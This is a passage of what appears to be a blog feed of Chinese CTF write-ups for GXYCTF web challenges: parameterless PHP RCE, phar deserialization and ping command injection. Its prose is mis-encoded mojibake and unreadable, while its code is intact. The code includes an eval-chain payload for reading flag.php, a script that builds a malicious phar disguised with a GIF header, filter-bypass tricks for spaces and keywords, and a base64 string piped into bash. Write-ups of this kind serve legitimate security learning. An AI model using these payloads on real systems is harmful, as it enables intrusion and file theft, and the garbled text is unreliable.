class="lazyload" data-srcset="7.jpg" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="flag"></p>]]></content>
      
      
      
        <tags>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>GXYCTF--ç¦æ­¢å¥—å¨ƒ&amp;BabaySqli-v3.0</title>
      <link href="2020/01/14/GXYCTF--%E7%A6%81%E6%AD%A2%E5%A5%97%E5%A8%83&amp;BabaySqli-v3.0/"/>
      <url>2020/01/14/GXYCTF--%E7%A6%81%E6%AD%A2%E5%A5%97%E5%A8%83&amp;BabaySqli-v3.0/</url>
      
        <content type="html"><![CDATA[<p>ä»Šå¤©ä¹Ÿæ¥æ¥ç€åšä¸‹GXYçš„å‡ é“webé¢˜</p><h1 id="ç¦æ­¢å¥—å¨ƒ"><a href="#ç¦æ­¢å¥—å¨ƒ" class="headerlink" title="ç¦æ­¢å¥—å¨ƒ"></a>ç¦æ­¢å¥—å¨ƒ</h1><p>é¦–å…ˆæ˜¯ç¦æ­¢å¥—å¨ƒè¿™ä¸€é“ï¼Œé¢˜ç›®ç±»å‹ä¸ºæ— å‚RCEã€‚æˆ‘ä¹Ÿæ˜¯é€šè¿‡è¿™ä¸€é“é¢˜æ‰äº†è§£åˆ°æ— å‚RCEè¿™ä¸ªåè¯ï¼Œä¸è¿‡åæ¥ä»”ç»†æƒ³æƒ³ï¼ŒåŸæ¥åšè¿‡çš„BugKuçš„è¿‡ç‹—ä¸€å¥è¯ä¹Ÿæœ‰ç›¸ä¼¼ä¹‹å¤„â€¦â€¦</p><p>è¯ä¸å¤šè¯´ï¼Œå…ˆç»™å‡ºæˆ‘å‚è€ƒçš„æ–‡ç« ï¼š</p><a id="more"></a><p><a href="https://www.gem-love.com/websecurity/530.html" target="_blank" rel="noopener">https://www.gem-love.com/websecurity/530.html</a><br>å‰é¢çš„å¸ˆå‚…é‡Œé¢æåˆ°äº†skyå¸ˆå‚…çš„åšæ–‡ï¼Œæ‰€ä»¥æˆ‘ä¹Ÿå‚è€ƒäº†ä¸‹ã€‚</p><p>é‚£ä¹ˆé¦–å…ˆï¼Œå‡ºç°æ— å‚RCEçš„å¿…è¦æ¡ä»¶æ˜¯ä»€ä¹ˆå‘¢ï¼Ÿå¤§æŠµæ˜¯å¦‚ä¸‹çš„æ­£åˆ™ï¼š</p><pre><code>if(&#39;;&#39; === preg_replace(&#39;/[^\W]+\((?R)?\)/&#39;, &#39;&#39;, $_GET[&#39;code&#39;])) {        eval($_GET[&#39;code&#39;]);}</code></pre><p>è¿™é‡Œ?Ræ˜¯å¼•ç”¨å½“å‰è¡¨è¾¾å¼çš„æ„æ€ï¼Œé‚£ä¹ˆé…ä¸Šå‰é¢çš„æˆåˆ†ï¼Œæˆ‘ä»¬è¢«å…è®¸çš„å‚æ•°å€¼å¿…é¡»å…·æœ‰ä»¥ä¸‹å½¢å¼ï¼š<br>a(b(c())<br>a()<br>è€Œä¸æ˜¯a(â€˜342â€™)ä¹‹ç±»çš„ã€‚</p><p>é‚£ä¹ˆå›åˆ°é¢˜ç›®ä¸Šæ¥ï¼Œé¦–å…ˆç½‘é¡µå¹¶æ²¡æœ‰å¤ªå¤šä¿¡æ¯ï¼Œé‚£ä¹ˆæˆ‘ä»¬å¸¸è§„å‡ æ¿æ–§æ‹¿å‡ºæ¥ï¼š1.æŠ“åŒ…ï¼Œæœ‰æ²¡æœ‰æœ‰ç”¨çš„ä¿¡æ¯ï¼Ÿ2.ç½‘é¡µæºç ï¼Œæœ‰æ²¡æœ‰æç¤ºï¼Ÿ3.æºç æ³„éœ²ï¼Œgit,svnç­‰ç­‰è¯•ä¸€é4.æ‰«ç›®å½•ï¼Œçœ‹æœ‰æ²¡æœ‰æœ‰è¶£çš„ç›®å½•å¯ä»¥å‘æ˜5.å®åœ¨ä¸è¡Œçœ‹çœ‹é¢˜ç›®çš„åå­—ï¼Œç½‘é¡µçš„æ¡†æ¶ï¼Œæœ‰æ²¡æœ‰æç¤ºä½ å¯èƒ½å­˜åœ¨çš„æ¼æ´  ã€‚æˆ‘ä¸ªäººè®¤ä¸ºæ­£å¸¸çš„é¢˜ç›®è¿™æ ·åšè‚¯å®šå¯ä»¥ç»§ç»­å‘å±•ä¸‹å»è€Œä¸è‡³äºä¸€ç­¹è«å±•ã€‚<br>å½“ç„¶ï¼Œæ­¤å¤„æ˜¯å¾ˆå¸¸è§çš„.gitæºç æ³„éœ²ï¼Œæˆ‘ä»¬æŠŠgithackæ‹¿ä¸‹æ¥çš„index.phpçœ‹ä¸€çœ‹ï¼š</p><pre><code class="php">&lt;?phpinclude &quot;flag.php&quot;;echo &quot;flagåœ¨å“ªé‡Œå‘¢ï¼Ÿ&lt;br&gt;&quot;;if(isset($_GET[&#39;exp&#39;])){    if (!preg_match(&#39;/data:\/\/|filter:\/\/|php:\/\/|phar:\/\//i&#39;, $_GET[&#39;exp&#39;])) {        if(&#39;;&#39; === preg_replace(&#39;/[a-z,_]+\((?R)?\)/&#39;, NULL, $_GET[&#39;exp&#39;])) {            if (!preg_match(&#39;/et|na|info|dec|bin|hex|oct|pi|log/i&#39;, $_GET[&#39;exp&#39;])) {                // echo $_GET[&#39;exp&#39;];                @eval($_GET[&#39;exp&#39;]);            }            else{                die(&quot;è¿˜å·®ä¸€ç‚¹å“¦ï¼&quot;);            }        }        else{            die(&quot;å†å¥½å¥½æƒ³æƒ³ï¼&quot;);        }    }    else{        die(&quot;è¿˜æƒ³è¯»flagï¼Œè‡­å¼Ÿå¼Ÿï¼&quot;);    }}// highlight_file(__FILE__);?&gt;</code></pre><p>åˆ°è¿™å°±å¯ä»¥ç¡®è®¤æ˜¯æ— å‚RCEäº†ï¼Œé‚£ä¹ˆç°åœ¨æ¥å°ç»“ä¸‹å¦‚ä½•åº”å¯¹æ— å‚RCEä»¥åŠå¦‚ä½•è¿‡è¿™é‡Œçš„æ­£åˆ™ï¼š<br>é¦–å…ˆæ˜ç¡®ä¸€ç‚¹ï¼ŒåŸºäºæ— å‚RCEçš„æ ¼å¼è¦æ±‚ï¼Œæˆ‘ä»¬å¯åˆ©ç”¨çš„æœ‰å¾ˆå¤šï¼Œå…¶ä¸­ä¸»è¦åŒ…æ‹¬å…¨å±€å˜é‡ä»¥åŠè¿”å›å€¼æœ‰ç‰¹æ®Šæ€§çš„å‡½æ•°ã€‚ç”šè‡³å¯ä»¥åƒskyé‚£æ ·ï¼Œé€šè¿‡getallheaders()æ‹¿åˆ°ç¯å¢ƒå˜é‡ï¼Œä½¿è‡ªå·±ä¼ å‚çš„å‚æ•°å˜ä¸ºå¯æ§çš„ï¼Œè¿›è€Œæ‰§è¡Œå‘½ä»¤ã€‚<br>é‚£ä¹ˆå›åˆ°é¢˜ç›®ä¸Šï¼Œç°åœ¨è‚¯å®šç¬¬ä¸€æ­¥æ˜¯çœ‹çœ‹ç›®å½•äº†ï¼Œä»skyé‚£å­¦åˆ°çš„å¸¸è§„æ‰‹æ³•ï¼Œæ˜¯getcwd()è·å¾—å½“å‰ç›®å½•ï¼Œscandir(getcwd())è·å¾—å½“å‰ç›®å½•çš„æ–‡ä»¶ã€‚è€Œå¦‚æœè¦å¾€ä¸Šå±‚ç›®å½•çœ‹çš„è¯ï¼Œå°±åˆ©ç”¨dirname()ï¼Œä½¿ç”¨scandir(dirname(getcwd()))ã€‚ä¸è¿‡è¿™é‡Œæˆ‘è¯•äº†ä¸‹å¥½åƒä¸å¤ªè¡Œï¼Œæ‰€ä»¥æ”¹ç”¨å…¶ä»–æ–¹æ³•ï¼š<br>æˆ‘ä»¬çŸ¥é“ï¼Œscandir()è¯»å½“å‰ç›®å½•çš„ç”¨æ³•æ˜¯scandir(â€˜.â€™),ä½†è¿™é‡Œçš„â€™.â€™è¦æ€ä¹ˆè·å¾—å‘¢ï¼Ÿé‚£å°±è¦æ¶‰åŠåˆ°ä¸€ä¸ªé«˜çº§ç”¨æ³•</p><pre><code>current(localeconv())</code></pre><p>æœ¬åœ°è¯•ä¸€ä¸‹ç»“æœï¼š<br><img src="/2020/01/14/GXYCTF--%E7%A6%81%E6%AD%A2%E5%A5%97%E5%A8%83&BabaySqli-v3.0/1.jpg" class="lazyload" data-srcset="1.jpg" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="localeconv"><br><img src="/2020/01/14/GXYCTF--%E7%A6%81%E6%AD%A2%E5%A5%97%E5%A8%83&BabaySqli-v3.0/2.jpg" class="lazyload" data-srcset="2.jpg" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="current(localeconv)"><br>åè€…ä¹‹è¿”å›ä¸€ä¸ªç‚¹ï¼Œæ˜¯å®Œå…¨å¯ä»¥åˆ©ç”¨äº†ã€‚<br>æ‰«ç›®å½•</p><pre><code class="php">print_r(scandir(current(localeconv())));</code></pre><p><img src="/2020/01/14/GXYCTF--%E7%A6%81%E6%AD%A2%E5%A5%97%E5%A8%83&BabaySqli-v3.0/3.jpg" class="lazyload" data-srcset="3.jpg" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="dir"></p><p>é‚£ä¹ˆæ¥ä¸‹æ¥å°±è¦è¯»flag.phpäº†ï¼Œè¿™é‡Œæˆ‘ä»¬å½“ç„¶åªèƒ½åˆ©ç”¨flag.phpåœ¨è¿”å›çš„æ•°ç»„ä¸­çš„é”®å€¼æ¥æ“ä½œä¸‹ã€‚å¦‚æœflag.phpæ˜¯æ•°ç»„æœ€åä¸€ä¸ªæ•°å€¼çš„è¯ï¼Œç›´æ¥end()å°±è§£å†³äº†ã€‚ä¸è¿‡è¿™é‡Œæ˜¯å€’æ•°ç¬¬äºŒä¸ªï¼Œæ‰€ä»¥æœ‰å…¶ä»–æ–¹æ³•æ“ä½œï¼š<br>1.è¿æ°”æ³•<br>hhhå› ä¸ºæ˜¯é éšæœºæ•°ï¼Œæˆ‘è®¤ä¸ºå¹²è„†å«è¿æ°”ä½¿ç„¶å¥½äº†ã€‚</p><pre><code class="php">array_rand(array_flip(scandir(current(localeconv()))))</code></pre><p>è¿™é‡Œarray_rand()ä¸å¤šè¯´ï¼Œå°±æ˜¯éšæœºè·å¾—æ•°ç»„ä¸­ä¸€ä¸ªä¸‹æ ‡ï¼Œè€Œarray_flipåˆ™å¯ä»¥äº¤æ¢é”®ä¸å€¼ã€‚é‚£ä¹ˆè¿”å›çš„å°±å˜æˆå€¼äº†ã€‚<br>å› ä¸ºè¿™é‡Œåªæœ‰äº”ä¸ªæ–‡ä»¶ï¼Œæˆ‘ä»¬ç”¨éšæœºæ•°å®Œå…¨ä¸ç”¨å…³å¿ƒå…¶éšæœºæ€§ã€‚</p><p>2.ä½¿ç”¨array_reverseåŠ ä¸Šnext()ï¼ŒæŠŠæ•°ç»„é€†è¿‡æ¥åï¼Œflag.phpå˜æˆç¬¬äºŒä¸ªå…ƒç´ ï¼Œæ°å·§æ˜¯æ•°ç»„åæŒ‡é’ˆä¸‹ä¸€ä¸ªï¼Œä½¿ç”¨next()å³å¯ã€‚</p><p>æœ€åï¼Œä½¿ç”¨readfile()æˆ–highlight_fileè¯»æ–‡ä»¶å³å¯<br>payload:</p><pre><code class="php">exp=print_r(readfile(array_rand(array_flip(scandir(current(localeconv()))))));</code></pre><h1 id="BabySqli-v3-0"><a href="#BabySqli-v3-0" class="headerlink" title="BabySqli v3.0"></a>BabySqli v3.0</h1><p>pharååºåˆ—åŒ–çš„é¢˜ç›®ã€‚å…¶å®ä»å»å¹´10æœˆä»½åˆ°ç°åœ¨è‡ªå·±å·²ç»å¬è¿‡æ— æ•°æ¬¡pharååºåˆ—åŒ–çš„æ¼æ´äº†ï¼Œè€Œä¸”å­¦æ ¡é‡Œå¸ˆå‚…ä»¬ä¹Ÿä¸€ç›´åœ¨æ•´ç›¸å…³çš„popé“¾ä»€ä¹ˆçš„ï¼Œå› æ­¤å¯’å‡ä¸€å®šè¦è§£å†³è¿™ä¸ªçŸ¥è¯†ç‚¹ï¼ˆå¥½åƒå·²ç»æ¬ äº†ä¸å°‘çŸ¥è¯†â€¦â€¦ssrfä»å»å¹´8æœˆåˆ°ç°åœ¨è¿˜æ²¡æœ‰ç³»ç»Ÿçš„å¥½å¥½å­¦è¿‡â€¦â€¦ï¼‰</p><p>è¿™é“é¢˜ä¹Ÿç®—æ˜¯è‡ªå·±çš„ç¬¬ä¸€é“pharååºåˆ—åŒ–çš„é¢˜ç›®å§ï¼Œæ•´ä½“ä¸ç®—éš¾ã€‚<br>ä¸è¿‡æ¯”èµ›æ—¶çš„å¸ˆå‚…ä»¬å¯èƒ½ä¸è¿™ä¹ˆæƒ³ï¼Œå› ä¸ºè¿™é“é¢˜çš„åå­—å®¹æ˜“æŠŠäººå¼•å‘sqlæ³¨å…¥ä¸Šï¼Œä½†å…¶å®ç™»å½•ç•Œé¢å°±æ˜¯ä¸ªå¼±å£ä»¤admin passwordã€‚ä¼°è®¡å‘äº†ä¸å°‘äººå§ã€‚</p><p>ç™»å½•è¿›å»åï¼Œçœ‹åˆ°ä¸€ä¸ªæ–‡ä»¶ä¸Šä¼ (ç°åœ¨çš„æ–‡ä»¶ä¸Šä¼ é¢˜å¾ˆå¤šå°±æ˜¯pharçš„çŸ¥è¯†ç‚¹ï¼Œæ¯”å¦‚çº¢å¸½æ¯)<br><img src="/2020/01/14/GXYCTF--%E7%A6%81%E6%AD%A2%E5%A5%97%E5%A8%83&BabaySqli-v3.0/4.jpg" class="lazyload" data-srcset="4.jpg" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="ä¸Šä¼ "></p><p>åŒæ—¶æ³¨æ„åˆ°æœ‰fileå‚æ•°ä¸ºuploadï¼Œå¯èƒ½æ˜¯ä¸ªæ–‡ä»¶åŒ…å«çš„ç‚¹ã€‚å› æ­¤æˆ‘ä»¬å°è¯•ä¸€ä¸‹è®¿é—®ï¼Œå‘ç°ç¡®å®å­˜åœ¨upload.php.åŒç†ï¼Œå¯ä»¥ç¡®è®¤æœ‰flag.phpã€‚ä½†æ˜¾ç„¶è¢«banäº†ã€‚å› æ­¤å†å›åˆ°fileå‚æ•°ä¸Šï¼Œé™¤äº†ç›´æ¥çš„æ–‡ä»¶åŒ…å«ï¼Œå½“ç„¶ä¹Ÿå¯ä»¥ç”¨ä¼ªåè®®è¯•è¯•ï¼Œäºæ˜¯æˆåŠŸæ‹¿åˆ°home.phpæºç ã€‚è§£ç åå¾—ï¼š</p><pre><code class="php">&lt;?phperror_reporting(0);class Uploader{    public $Filename;    public $cmd;    public $token;    function __construct(){        $sandbox = getcwd().&quot;/uploads/&quot;.md5($_SESSION[&#39;user&#39;]).&quot;/&quot;;        $ext = &quot;.txt&quot;;        @mkdir($sandbox, 0777, true);        if(isset($_GET[&#39;name&#39;]) and !preg_match(&quot;/data:\/\/ | filter:\/\/ | php:\/\/ | \./i&quot;, $_GET[&#39;name&#39;])){            $this-&gt;Filename = $_GET[&#39;name&#39;];        }        else{            $this-&gt;Filename = $sandbox.$_SESSION[&#39;user&#39;].$ext;        }        $this-&gt;cmd = &quot;echo &#39;&lt;br&gt;&lt;br&gt;Master, I want to study rizhan!&lt;br&gt;&lt;br&gt;&#39;;&quot;;        $this-&gt;token = $_SESSION[&#39;user&#39;];    }    function upload($file){        global $sandbox;        global $ext;        if(preg_match(&quot;[^a-z0-9]&quot;, $this-&gt;Filename)){            $this-&gt;cmd = &quot;die(&#39;illegal filename!&#39;);&quot;;        }        else{            if($file[&#39;size&#39;] &gt; 1024){                $this-&gt;cmd = &quot;die(&#39;you are too big (â€²â–½`ã€ƒ)&#39;);&quot;;            }            else{                $this-&gt;cmd = &quot;move_uploaded_file(&#39;&quot;.$file[&#39;tmp_name&#39;].&quot;&#39;, &#39;&quot; . $this-&gt;Filename . &quot;&#39;);&quot;;            }        }    }    function __toString(){        global $sandbox;        global $ext;        // return $sandbox.$this-&gt;Filename.$ext;        return $this-&gt;Filename;    }    function __destruct(){        if($this-&gt;token != $_SESSION[&#39;user&#39;]){            $this-&gt;cmd = &quot;die(&#39;check token falied!&#39;);&quot;;        }        eval($this-&gt;cmd);    }}if(isset($_FILES[&#39;file&#39;])) {    $uploader = new Uploader();    $uploader-&gt;upload($_FILES[&quot;file&quot;]);    if(@file_get_contents($uploader)){        echo &quot;ä¸‹é¢æ˜¯ä½ ä¸Šä¼ çš„æ–‡ä»¶ï¼š&lt;br&gt;&quot;.$uploader.&quot;&lt;br&gt;&quot;;        echo file_get_contents($uploader);    }}?&gt;</code></pre><p>åˆ°è¿™é‡Œå°±æœ‰ç‚¹ä»¥å‰ååºåˆ—åŒ–çš„æ„æ€äº†ï¼Œè€Œä¹‹æ‰€ä»¥é¢˜ç›®æ˜¯pharååºåˆ—åŒ–ï¼Œå°±æ˜¯å› ä¸ºpharçš„ä¼˜åŠ¿å°±åœ¨äºå¯ä»¥åœ¨ä¼ªé€ æ–‡ä»¶ç±»å‹çš„åŒæ—¶åˆ©ç”¨phar://æ¥è¿›è¡Œååºåˆ—åŒ–ã€‚é‚£æˆ‘ä»¬ç›´æ¥çœ‹çœ‹è¦å¦‚ä½•åˆ©ç”¨ï¼š<br>é¦–å…ˆæ˜¯æ‰¾å¯æ§å‚æ•°ï¼Œæˆ‘ä»¬æ‰¾åˆ°nameå‚æ•°æ˜¯é€šè¿‡getä¼ çš„ï¼š</p><pre><code class="php"> $this-&gt;Filename = $_GET[&#39;name&#39;];</code></pre><p>ä¹‹ååœ¨æ‰¾å¯ä»¥æ‰§è¡Œå‘½ä»¤çš„ç‚¹</p><pre><code class="php">function __destruct(){        if($this-&gt;token != $_SESSION[&#39;user&#39;]){            $this-&gt;cmd = &quot;die(&#39;check token falied!&#39;);&quot;;        }        eval($this-&gt;cmd);    }</code></pre><p>åªè¦ä¿è¯tokenæ˜¯ä¸userçš„sessionç›¸åŒå³å¯evalæ‰§è¡Œå‘½ä»¤ã€‚<br>é‚£ä¹ˆåŒæ—¶æˆ‘ä»¬å®ä¾‹åŒ–çš„å¯¹è±¡$uploaderåœ¨_toStringæ–¹æ³•ä¸­çœ‹åˆ°ï¼Œè¿”å›å€¼æ˜¯filename,ä¹Ÿæ˜¯æˆ‘ä»¬å¯æ§çš„nameçš„å€¼ã€‚é‚£æˆ‘ä»¬åªè¦è®©æœ€åçš„file_get_contents()æ‰§è¡Œæ—¶è¯»æˆ‘ä»¬å¯æ§çš„flag.phpå°±å¥½äº†ã€‚æ—¢ç„¶å¦‚æ­¤ï¼Œå…ˆéšä¾¿ä¼ ä¸€ä¸ªæ–‡ä»¶ç¡®å®šä¸‹æç¤ºæˆ‘ä»¬çš„æ–‡ä»¶ä½ç½®ï¼Œç¡®è®¤token,ç„¶åæœ¬åœ°ç”Ÿæˆpharæ–‡ä»¶</p><pre><code class="php">&lt;?phpclass Uploader{    public $Filename;    public $cmd;    public $token;}$o=new Uploader();$o-&gt;cmd=&#39;highlight_file(&quot;/var/www/html/flag.php)&#39;;$o-&gt;Filename=&#39;test&#39;;$o-&gt;token=&#39;GXYbef648df4f254d89810fd44f9a2fc822&#39;;echo serialize($o);$phar = new Phar(&quot;phar.phar&quot;);$phar-&gt;startBuffering();$phar-&gt;setStub(&quot;GIF89a&quot;.&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;);//è®¾ç½®stubï¼Œå¢åŠ gifæ–‡ä»¶å¤´$phar-&gt;setMetadata($o); //å°†è‡ªå®šä¹‰meta-dataå­˜å…¥manifest$phar-&gt;addFromString(&quot;test.txt&quot;, &quot;test&quot;); //æ·»åŠ è¦å‹ç¼©çš„æ–‡ä»¶$phar-&gt;stopBuffering();?&gt;</code></pre><p>ä¸Šä¼ pharåï¼Œnameå‚æ•°èµ‹å€¼<br><code>phar://+ä¸Šä¼ pharæ–‡ä»¶çš„åœ°å€</code><br>å†éšä¾¿ä¸Šä¼ æ–‡ä»¶å°±å¯ä»¥è§¦å‘pharååºåˆ—åŒ–ï¼Œè¾¾åˆ°å‘½ä»¤æ‰§è¡Œã€‚</p><p>å…¶å®å› ä¸ºå‡ºé¢˜äººå¤šæ‰“äº†ä¸€ä¸ªç©ºæ ¼ï¼Œå¯¼è‡´æ­£åˆ™åŒ¹é…æ²¡æ•ˆæœâ€¦â€¦ç›´æ¥ä¼ ä¸€å¥è¯æˆ–è€…ç›´æ¥åŒ…å«flag.phpåä¼ æ–‡ä»¶éƒ½å¯ä»¥æ‹¿flagâ€¦â€¦</p><p>GXYçš„é¢˜å°±å…ˆå‘Šä¸€æ®µè½å§ï¼Œæ˜å¤©è¿˜è¦åšåšä»£ç å®¡è®¡çš„é¢˜ç›®ï¼Œä¹‹åè¦æŠŠåŸºç¡€æ¼æ´ç›¸å…³çŸ¥è¯†éƒ½äº†è§£é€å½»ï¼Œæ¯•ç«Ÿè‡ªå·±åº•å­ä¸ç‰¢ã€‚ç„¶åæŠŠæ¬ ç€çš„ssrf,pharç­‰ç­‰éƒ½ç³»ç»Ÿå­¦ä¸€å­¦åº”è¯¥å°±å¥½äº†</p>]]></content>
      
      
      
        <tags>
            
            <tag> WEB </tag>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>GXYCTF--PingPingPing&amp;BabySqli</title>
      <link href="2020/01/13/GXYCTF-PingPingPing-BabySqli/"/>
      <url>2020/01/13/GXYCTF-PingPingPing-BabySqli/</url>
      
        <content type="html"><![CDATA[<p>  è¯´æ¥æƒ­æ„§ï¼Œä¹‹å‰12æœˆä»½åˆæŠ¥äº†GWYCTF,ç»“æœåˆ°äº†æ¯”èµ›çš„æ—¶å€™åˆå› ä¸ºå¤ä¹ å¿™çš„ç„¦å¤´çƒ‚é¢ï¼Œæ‰€ä»¥ä¸€é“é¢˜ç›®éƒ½æ²¡çœ‹ã€‚åˆšå¥½å› ä¸ºé¢˜ç›®éš¾åº¦æ˜¯é’ˆå¯¹æ ¡å†…æ‹›æ–°çš„ï¼Œæˆ‘å°±ç°åœ¨å¤ç°ä¸‹å§ï¼š<br>é¢˜ç›®å¤ç°åœ°å€ï¼š<a href="https://buuoj.cn/" target="_blank" rel="noopener">https://buuoj.cn/</a><br>å¤§ä½¬ä»¬åœ¨å„ç§æ¯”èµ›ç¾¤é‡Œåº”è¯¥å·²ç»çŸ¥é“äº†è¿™ä¸ªå¹³å°çš„å­˜åœ¨äº†ï¼Œæœ‰ä¸€è¯´ä¸€é‚£ä½å¸ˆå‚…æ˜¯çœŸçš„å¯Œâ€¦â€¦<br>è¿˜æ˜¯è¦æ„Ÿè°¢buuoj.cnæä¾›äº†ä¸€ä¸ªå¤ç°è¿™äº›å¹´å¤§èµ›é¢˜ç›®çš„æœºä¼šã€‚</p><a id="more"></a><h1 id="Ping-Ping-Ping"><a href="#Ping-Ping-Ping" class="headerlink" title="Ping Ping Ping"></a>Ping Ping Ping</h1><p>å¼€å§‹è¿›å…¥æç¤ºä¼ å‚ip,åŸé¢˜åº”è¯¥æ˜¯ç›´æ¥ç»™äº†ä¸€ä¸ªè¾“å…¥æ¡†ï¼Œè¾“å…¥åå‘ç°æœ‰æ‰§è¡Œpingå‘½ä»¤çš„æ•ˆæœ<br>é‚£ä¹ˆçœ‹æ¥æ˜¯å‘½ä»¤æ‰§è¡Œçš„é¢˜ç›®äº†ï¼Œå‘½ä»¤æ‰§è¡Œçš„æ–¹æ³•å¤§æŠµæ˜¯åŠ ä¸Šç®¡é“ç¬¦æˆ–è€…åˆ†å·ï¼Œé‚£ä¹ˆè¯•è¯•ç®¡é“ç¬¦<br><img src="/2020/01/13/GXYCTF-PingPingPing-BabySqli/1.jpg" class="lazyload" data-srcset="1.jpg" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="ls"><br>å°è¯•è¯»flagå‘ç°æœç„¶è¢«banäº†ï¼Œé‚£ä¹ˆè¯•è¯•index.phpå‘ç°æç¤ºç©ºæ ¼è¢«banäº†ã€‚<br>ç»•è¿‡ç©ºæ ¼çš„æ–¹æ³•å¤§æ¦‚æœ‰ä»¥ä¸‹å‡ ç§ï¼š</p><pre><code>$IFS${IFS}$IFS$1 //$1æ”¹æˆ$åŠ å…¶ä»–æ•°å­—è²Œä¼¼éƒ½è¡Œ&lt; &lt;&gt; {cat,flag.php}  //ç”¨é€—å·å®ç°äº†ç©ºæ ¼åŠŸèƒ½%20 %09 </code></pre><p>ä¸å¦¨å°±ç”¨ <code>$IFS</code>è¯•è¯•ï¼Œæ— æœï¼Œç”¨<code>${IFS}</code>å‘ç°{}è¢«banã€‚å†è¯•<code>$IFS$1</code>æˆåŠŸã€‚<br>æºç å¦‚ä¸‹ï¼š</p><pre><code class="php">/?ip=|\&#39;|\&quot;|\\|\(|\)|\[|\]|\{|\}/&quot;, $ip, $match)){    echo preg_match(&quot;/\&amp;|\/|\?|\*|\&lt;|[\x{00}-\x{20}]|\&gt;|\&#39;|\&quot;|\\|\(|\)|\[|\]|\{|\}/&quot;, $ip, $match);    die(&quot;fxck your symbol!&quot;);  } else if(preg_match(&quot;/ /&quot;, $ip)){    die(&quot;fxck your space!&quot;);  } else if(preg_match(&quot;/bash/&quot;, $ip)){    die(&quot;fxck your bash!&quot;);  } else if(preg_match(&quot;/.*f.*l.*a.*g.*/&quot;, $ip)){    die(&quot;fxck your flag!&quot;);  }  $a = shell_exec(&quot;ping -c 4 &quot;.$ip);  echo &quot;&quot;;  print_r($a);}?&gt;</code></pre><p>è¿‡æ»¤äº†è®¸å¤šæ ‡ç‚¹ï¼Œç©ºæ ¼ï¼Œbash,åŒ…æ‹¬flagçš„è´ªå©ªåŒ¹é…ã€‚é‚£ä¹ˆè‡ªå·±å°è±¡ä¸­å‡ ç§åšæ³•ï¼š</p><pre><code>1.cat fl*       åˆ©ç”¨*åŒ¹é…ä»»æ„ ä¸è¡Œ2.echo &quot;Y2F0IGZsYWcucGhw&quot;| base64 -d | bash   ä¹Ÿä¸è¡Œ3.ca\t fl\ag.php   ä¸è¡Œ4.cat fl&#39;&#39;ag.php ä¸è¡Œ</code></pre><p>é‚£ä¹ˆå¦‚ä½•è§£å†³å‘¢ï¼Ÿå…¶å®è¿˜æœ‰ä¸€ç§æ¯”è¾ƒå¸¸è§çš„åšæ³•æ²¡æœ‰æåŠï¼Œé‚£å°±æ˜¯å˜é‡æ‹¼æ¥ï¼š<br><img src="/2020/01/13/GXYCTF-PingPingPing-BabySqli/2.jpg" class="lazyload" data-srcset="2.jpg" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="å˜é‡æ‹¼æ¥"><br>ä¹‹å‰è‡ªå·±ç‰¹åˆ«å–œæ¬¢ç”¨çš„ä¸€å¥è¯æœ¨é©¬æ‹†å¼€ç”¨ä¹Ÿæ˜¯è¿™ä¸ªé“ç†ã€‚</p><p>æ­£å¥½ï¼Œæˆ‘ä»¬çœ‹åˆ°æºç 